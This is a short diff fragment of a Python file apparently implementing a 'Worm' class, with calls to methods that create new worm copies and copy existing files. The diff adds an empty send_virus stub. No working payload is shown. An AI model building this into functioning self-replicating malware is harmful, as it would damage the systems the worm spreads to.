@@ -66,8 +66,10 @@ class Worm:
         self.create_new_worm()
         self.copy_existing_files()
         
-        
-                        
+
+    def send_virus():
+        pass
+   
 if __name__=="__main__":
     current_directory = os.path.abspath("")
     worm = Worm(path=current_directory)
